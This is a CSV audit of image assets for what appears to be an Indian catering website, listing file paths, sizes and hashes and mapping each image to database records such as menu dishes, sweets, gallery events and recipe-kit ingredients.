Filename,Relative Path,Size (Bytes),SHA256 Hash,MD5 Hash,Status,DB Table,DB Record ID,DB Item Title,DB Image Column
blog_49_content_1.png,notforgittrack/blog/img/blog_49_content_1.png,2259795,10afd1221a0536fa7d87ff82c70799497b530b9820cd3a9b0dd3f98cc96c4ffd,95c6ff31ce4af592ee909f94ec3a1575,Static / Orphaned Disk Asset,,,,
blog_4_content_1.jpeg,notforgittrack/blog/img/blog_4_content_1.jpeg,437434,e65c59a16c877aba9a535122fb29791a6ac89640f9569609f13a37c18ae87f40,ae1f7adfe9d28bfeaae51608441c20cc,Static / Orphaned Disk Asset,,,,
blog_4_featured.jpeg,notforgittrack/blog/img/blog_4_featured.jpeg,437434,e65c59a16c877aba9a535122fb29791a6ac89640f9569609f13a37c18ae87f40,ae1f7adfe9d28bfeaae51608441c20cc,Static / Orphaned Disk Asset,,,,
blog_50_content_1.png,notforgittrack/blog/img/blog_50_content_1.png,2927494,b703a5c9587dd0c2549e5bec9e67345a5bbecd8508b626dc157ece091db7aa48,eafe5be05c792fc5dac2885bd9cf2f2a,Static / Orphaned Disk Asset,,,,
blog_51_content_1.png,notforgittrack/blog/img/blog_51_content_1.png,2677137,84de36eb148af0f321cbe864ad01f03f00d29971bbd42d6d5adedd4f49e209b4,1c22e1d61cb43c27e0f079e7a76637fc,Static / Orphaned Disk Asset,,,,
blog_53_content_1.jpg,notforgittrack/blog/img/blog_53_content_1.jpg,80584,e341252107b075c1c068886628be5b00ee938c12d3239af7a54e5b2e82e64b49,644caa3082a9dc1b990a29d3a4e8a1f9,Static / Orphaned Disk Asset,,,,
blog_5_content_1.jpeg,notforgittrack/blog/img/blog_5_content_1.jpeg,375062,1fd5dccd4f6513831f47fcd0cf46e3d61aa6dfa302c05206bf81b16a3c862627,529900cd24f2f2446cbb0cf184769c90,Static / Orphaned Disk Asset,,,,
blog_5_featured.jpeg,notforgittrack/blog/img/blog_5_featured.jpeg,375062,1fd5dccd4f6513831f47fcd0cf46e3d61aa6dfa302c05206bf81b16a3c862627,529900cd24f2f2446cbb0cf184769c90,Static / Orphaned Disk Asset,,,,
blog_6_content_1.jpeg,notforgittrack/blog/img/blog_6_content_1.jpeg,624274,1e128a4f8d8005432539c4d4f82600e26eb8831abaec8c920975f400d3d6ff5e,f992aba074510eeff9bf66fd464af60a,Static / Orphaned Disk Asset,,,,
blog_6_featured.jpeg,notforgittrack/blog/img/blog_6_featured.jpeg,624274,1e128a4f8d8005432539c4d4f82600e26eb8831abaec8c920975f400d3d6ff5e,f992aba074510eeff9bf66fd464af60a,Static / Orphaned Disk Asset,,,,
blog_75_content_1.jpeg,notforgittrack/blog/img/blog_75_content_1.jpeg,153406,37e7d9e1f099b41753f4ceb89b1d5369d52942e54efd58b058b9da5c5382d8a2,85606fccf29507a3162215dba26ae825,Static / Orphaned Disk Asset,,,,
blog_7_content_1.jpg,notforgittrack/blog/img/blog_7_content_1.jpg,547257,bd3e2e6695a1f047e645fab8bf83ed472485b17e6a3b5aca6ee6bf6669a8f4d1,dbf5ee834e7dc66967aa66d6436e3475,Static / Orphaned Disk Asset,,,,
blog_7_featured.jpg,notforgittrack/blog/img/blog_7_featured.jpg,547257,bd3e2e6695a1f047e645fab8bf83ed472485b17e6a3b5aca6ee6bf6669a8f4d1,dbf5ee834e7dc66967aa66d6436e3475,Static / Orphaned Disk Asset,,,,
blog_8_featured.jpg,notforgittrack/blog/img/blog_8_featured.jpg,569737,f0d04c7c8ecc9de9a2a67428dcd3bc05845d98855e479832761bd88c0f31c26e,1b98311153207703a4a84d85d8fec3a5,Static / Orphaned Disk Asset,,,,
blog_9_content_1.jpeg,notforgittrack/blog/img/blog_9_content_1.jpeg,531729,679a3359ed7540a3cd0f6e01bf50fa24ebcbe05e2e6952d60af85e081516510c,4c36883a9827773e58c8ae0a7bc8ac3c,Static / Orphaned Disk Asset,,,,
blog_9_featured.jpeg,notforgittrack/blog/img/blog_9_featured.jpeg,531729,679a3359ed7540a3cd0f6e01bf50fa24ebcbe05e2e6952d60af85e081516510c,4c36883a9827773e58c8ae0a7bc8ac3c,Static / Orphaned Disk Asset,,,,
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,notforgittrack/the-famous-halwai-images/images/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpeg,notforgittrack/the-famous-halwai-images/images/10.jpeg,14662,ef167e1088bca29a322b4f713173de84605c905cfc97b01cde3a54f91b11a405,d9f091839b78fe2c7def2ba115d1d9d7,DB Mapped (Verified),menu_item_tbl,10,Dal Makhini,menu_img
100.jpg,notforgittrack/the-famous-halwai-images/images/100.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,100,Gulgula - Uttarakhand,menu_img
101.jpeg,notforgittrack/the-famous-halwai-images/images/101.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,101,Arsa - Uttarakhand,menu_img
102.jpg,notforgittrack/the-famous-halwai-images/images/102.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,102,Naivedyam - Bihar,menu_img
103.jpeg,notforgittrack/the-famous-halwai-images/images/103.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,103,Chandrakala/ Pedakiya - Bihar,menu_img
104.jpg,notforgittrack/the-famous-halwai-images/images/104.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,104,Khaja - Bihar,menu_img
105.webp,notforgittrack/the-famous-halwai-images/images/105.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,105,Kesar Peda - Bihar,menu_img
106.jpg,notforgittrack/the-famous-halwai-images/images/106.jpg,407462,341988e7a8b56b4d76ab7741e9c7fe3eae23ddeed0b538f3d57770abcfcfd4be,910a2dc7e3ccb2cff43b79b18f892bcc,DB Mapped (Verified),menu_item_tbl,106,Laung-Latika - Bihar,menu_img
107.jpeg,notforgittrack/the-famous-halwai-images/images/107.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,107,Malpua - Bihar,menu_img
108.webp,notforgittrack/the-famous-halwai-images/images/108.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,108,Rasia - Bihar,menu_img
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,notforgittrack/the-famous-halwai-images/images/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
110.jpeg,notforgittrack/the-famous-halwai-images/images/110.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,110,Khurma And Laktho - Bihar,menu_img
111.jpeg,notforgittrack/the-famous-halwai-images/images/111.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,111,Balushahi - Bihar,menu_img
112.jpeg,notforgittrack/the-famous-halwai-images/images/112.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,112,Parwal ki Mithai - Bihar,menu_img
113.jpeg,notforgittrack/the-famous-halwai-images/images/113.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,113,Gur Anarsa - Bihar,menu_img
114.jpeg,notforgittrack/the-famous-halwai-images/images/114.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,114,Laai - Bihar,menu_img
115.jpeg,notforgittrack/the-famous-halwai-images/images/115.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,115,Tilkut - Bihar,menu_img
116.jpg,notforgittrack/the-famous-halwai-images/images/116.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,116,Litti Chokha - Bihar,menu_img
116.jpg,notforgittrack/the-famous-halwai-images/images/116.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,116,Litti Chokha - Bihar,menu_small_img
117.jpg,notforgittrack/the-famous-halwai-images/images/117.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,117,Chana Ghugni - Bihar,menu_img
117.jpg,notforgittrack/the-famous-halwai-images/images/117.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,117,Chana Ghugni - Bihar,menu_small_img
118.jpg,notforgittrack/the-famous-halwai-images/images/118.jpg,14617,b97b73de898a9696ad59302bcea5a6d9e645747f0b73150b2f0994620a595528,f261d7eb63d1769cd2a1f309fa6774f8,DB Mapped (Verified),menu_item_tbl,118,Mutton Kebabs & Reshmi Kebabs - Bihar,menu_img
118.jpg,notforgittrack/the-famous-halwai-images/images/118.jpg,14617,b97b73de898a9696ad59302bcea5a6d9e645747f0b73150b2f0994620a595528,f261d7eb63d1769cd2a1f309fa6774f8,DB Mapped (Verified),menu_item_tbl,118,Mutton Kebabs & Reshmi Kebabs - Bihar,menu_small_img
119.jpeg,notforgittrack/the-famous-halwai-images/images/119.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,119,Dal Peetha - Bihar,menu_img
119.jpeg,notforgittrack/the-famous-halwai-images/images/119.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,119,Dal Peetha - Bihar,menu_small_img
12.webp,notforgittrack/the-famous-halwai-images/images/12.webp,50084,da26dbfd180c3f7b774c92b0ca4643762e56f3b45114129f42158177e166eb57,3f9c183cef6e5274b434112eb69709b3,DB Mapped (Verified),menu_item_tbl,12,Malai Kofta,menu_img
120.jpg,notforgittrack/the-famous-halwai-images/images/120.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,120,Khajuria/Thekua - Bihar,menu_img
120.jpg,notforgittrack/the-famous-halwai-images/images/120.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,120,Khajuria/Thekua - Bihar,menu_small_img
121.webp,notforgittrack/the-famous-halwai-images/images/121.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,121,Puri Sabzi - Bihar,menu_img
121.webp,notforgittrack/the-famous-halwai-images/images/121.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,121,Puri Sabzi - Bihar,menu_small_img
122.jpg,notforgittrack/the-famous-halwai-images/images/122.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,122,Sattu Sharbat - Bihar,menu_img
122.jpg,notforgittrack/the-famous-halwai-images/images/122.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,122,Sattu Sharbat - Bihar,menu_small_img
123.JPG,notforgittrack/the-famous-halwai-images/images/123.JPG,15529,c7bb429187506f63d57abab808b7b2ce858ec9bef33609c256451558a92000b5,cbd559d3da348464d918e8b6055fc49a,DB Mapped (Verified),menu_item_tbl,123,Sattu Paratha - Bihar,menu_img
123.JPG,notforgittrack/the-famous-halwai-images/images/123.JPG,15529,c7bb429187506f63d57abab808b7b2ce858ec9bef33609c256451558a92000b5,cbd559d3da348464d918e8b6055fc49a,DB Mapped (Verified),menu_item_tbl,123,Sattu Paratha - Bihar,menu_small_img
124.jpeg,notforgittrack/the-famous-halwai-images/images/124.jpeg,15745,036ac766a5cdb5653f0c05e1ca831eb33198374ef92fee4576b50e34fa4f62e8,32c0bcebbeeca789df9c4922e0dc18dd,DB Mapped (Verified),menu_item_tbl,124,Singri ki Sabzi,menu_img
124.jpeg,notforgittrack/the-famous-halwai-images/images/124.jpeg,15745,036ac766a5cdb5653f0c05e1ca831eb33198374ef92fee4576b50e34fa4f62e8,32c0bcebbeeca789df9c4922e0dc18dd,DB Mapped (Verified),menu_item_tbl,124,Singri ki Sabzi,menu_small_img
125.webp,notforgittrack/the-famous-halwai-images/images/125.webp,60970,a3386d5b9020fdbe376bff387353dbf4e5218dca060dd660f4165ac1d6d348fa,c32749492254243f209f7de604355af3,DB Mapped (Verified),menu_item_tbl,125,Mixed Dals,menu_img
125.webp,notforgittrack/the-famous-halwai-images/images/125.webp,60970,a3386d5b9020fdbe376bff387353dbf4e5218dca060dd660f4165ac1d6d348fa,c32749492254243f209f7de604355af3,DB Mapped (Verified),menu_item_tbl,125,Mixed Dals,menu_small_img
126.jpeg,notforgittrack/the-famous-halwai-images/images/126.jpeg,8207,55acdf72c5a3760c5fdd910330645fd20e0737e4d5efd00a2f2958dcfab21da9,f2766e3ceec3a52d9fc05b9a4be70c5e,DB Mapped (Verified),menu_item_tbl,126,Hara Dhania Choliya,menu_img
126.jpeg,notforgittrack/the-famous-halwai-images/images/126.jpeg,8207,55acdf72c5a3760c5fdd910330645fd20e0737e4d5efd00a2f2958dcfab21da9,f2766e3ceec3a52d9fc05b9a4be70c5e,DB Mapped (Verified),menu_item_tbl,126,Hara Dhania Choliya,menu_small_img
127.jpeg,notforgittrack/the-famous-halwai-images/images/127.jpeg,13441,7c83bebb5b99b29c1fb4eee0543371ef2c8480d66f297e7bf7121c1fa070345d,933ac02c763255c99f4f237a6085efbc,DB Mapped (Verified),menu_item_tbl,127,Kadhi Pakora,menu_img
127.jpeg,notforgittrack/the-famous-halwai-images/images/127.jpeg,13441,7c83bebb5b99b29c1fb4eee0543371ef2c8480d66f297e7bf7121c1fa070345d,933ac02c763255c99f4f237a6085efbc,DB Mapped (Verified),menu_item_tbl,127,Kadhi Pakora,menu_small_img
128.jpeg,notforgittrack/the-famous-halwai-images/images/128.jpeg,12345,cc2ca49cf5f587b56ea4e7766413463cc4719ad18e1f639441b367c85a0cd182,3960a6a9093d1e84d06087ce3c3ee27a,DB Mapped (Verified),menu_item_tbl,128,Kachri ki Chutney,menu_img
128.jpeg,notforgittrack/the-famous-halwai-images/images/128.jpeg,12345,cc2ca49cf5f587b56ea4e7766413463cc4719ad18e1f639441b367c85a0cd182,3960a6a9093d1e84d06087ce3c3ee27a,DB Mapped (Verified),menu_item_tbl,128,Kachri ki Chutney,menu_small_img
129.jpeg,notforgittrack/the-famous-halwai-images/images/129.jpeg,13520,637261aa3b31c7ed6fe754c5775a9583f94bb34ebff5f30a78ea622fc06b86b1,eba4f73c182fbbd2b0c92f271cec9a34,DB Mapped (Verified),menu_item_tbl,129,Tamatar Chutney,menu_img
129.jpeg,notforgittrack/the-famous-halwai-images/images/129.jpeg,13520,637261aa3b31c7ed6fe754c5775a9583f94bb34ebff5f30a78ea622fc06b86b1,eba4f73c182fbbd2b0c92f271cec9a34,DB Mapped (Verified),menu_item_tbl,129,Tamatar Chutney,menu_small_img
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,notforgittrack/the-famous-halwai-images/images/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
130.webp,notforgittrack/the-famous-halwai-images/images/130.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,130,Dahi Vada,menu_img
130.webp,notforgittrack/the-famous-halwai-images/images/130.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,130,Dahi Vada,menu_small_img
131.jpeg,notforgittrack/the-famous-halwai-images/images/131.jpeg,8644,3e1664cceb6cccbe94034ff6f23fd625aec6c62202c0662c59c2d1e517fe9b36,7693d33c11abb4aae524e9721d27910a,DB Mapped (Verified),menu_item_tbl,131,Rajma Chawal,menu_img
131.jpeg,notforgittrack/the-famous-halwai-images/images/131.jpeg,8644,3e1664cceb6cccbe94034ff6f23fd625aec6c62202c0662c59c2d1e517fe9b36,7693d33c11abb4aae524e9721d27910a,DB Mapped (Verified),menu_item_tbl,131,Rajma Chawal,menu_small_img
132.webp,notforgittrack/the-famous-halwai-images/images/132.webp,64206,0a70e0fbb6880820ac7b5af61ebd1bdc155425e4300a85756d67b2984880d2f3,2f7c55da53a4fbdb269b62547a1f2d3d,DB Mapped (Verified),menu_item_tbl,132,Malpua - Haryana,menu_img
133.jpg,notforgittrack/the-famous-halwai-images/images/133.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,133,Mithe Chawal - Haryana,menu_img
134.jpeg,notforgittrack/the-famous-halwai-images/images/134.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,134,Methi Gaajar - Haryana,menu_img
135.webp,notforgittrack/the-famous-halwai-images/images/135.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,135,Alsi ki Pinni - Haryana,menu_img
136.jpg,notforgittrack/the-famous-halwai-images/images/136.jpg,54895,3098d32e20e94dd88233a4a9b3f3909a890e1a5f4534d5d9ed18e5f53547066e,69f7df5a20166f610db024e2d4f4b6cb,DB Mapped (Verified),menu_item_tbl,136,Besan Masala Roti - Haryana,menu_img
136.jpg,notforgittrack/the-famous-halwai-images/images/136.jpg,54895,3098d32e20e94dd88233a4a9b3f3909a890e1a5f4534d5d9ed18e5f53547066e,69f7df5a20166f610db024e2d4f4b6cb,DB Mapped (Verified),menu_item_tbl,136,Besan Masala Roti - Haryana,menu_small_img
137.jpg,notforgittrack/the-famous-halwai-images/images/137.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,137,Bhura Roti Ghee - Haryana,menu_img
137.jpg,notforgittrack/the-famous-halwai-images/images/137.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,137,Bhura Roti Ghee - Haryana,menu_small_img
138.jpg,notforgittrack/the-famous-halwai-images/images/138.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,138,Bajara Aloo Roti - Haryana,menu_img
138.jpg,notforgittrack/the-famous-halwai-images/images/138.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,138,Bajara Aloo Roti - Haryana,menu_small_img
139.jpg,notforgittrack/the-famous-halwai-images/images/139.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,139,Bajara Khichri - Haryana,menu_img
14.jpeg,notforgittrack/the-famous-halwai-images/images/14.jpeg,9108,11f6d2118b1fe891203710e26ef40071c21c4cdf10caee5ad42b9e840915b620,b5c735c46baf1441994ba535dd1ab4a5,DB Mapped (Verified),menu_item_tbl,14,Dum Aloo,menu_img
140.jpeg,notforgittrack/the-famous-halwai-images/images/140.jpeg,7669,fa4d481752bdc7bc7801f9106faa6c20b638ced816afa610b72037a782d278e8,5c180f7e63936651b3563ec423436e81,DB Mapped (Verified),menu_item_tbl,140,Pine Apple Sundae,menu_img
140.jpeg,notforgittrack/the-famous-halwai-images/images/140.jpeg,7669,fa4d481752bdc7bc7801f9106faa6c20b638ced816afa610b72037a782d278e8,5c180f7e63936651b3563ec423436e81,DB Mapped (Verified),menu_item_tbl,140,Pine Apple Sundae,menu_small_img
141.jpg,notforgittrack/the-famous-halwai-images/images/141.jpg,12444,a4d1e6fd32dcb11c1805af040118345b4e83d787fb4349b6c1bf85513b4e4432,f6e8c472da88613089fc32ad1afedd42,DB Mapped (Verified),menu_item_tbl,141,Strawberry Sundae,menu_img
141.jpg,notforgittrack/the-famous-halwai-images/images/141.jpg,12444,a4d1e6fd32dcb11c1805af040118345b4e83d787fb4349b6c1bf85513b4e4432,f6e8c472da88613089fc32ad1afedd42,DB Mapped (Verified),menu_item_tbl,141,Strawberry Sundae,menu_small_img
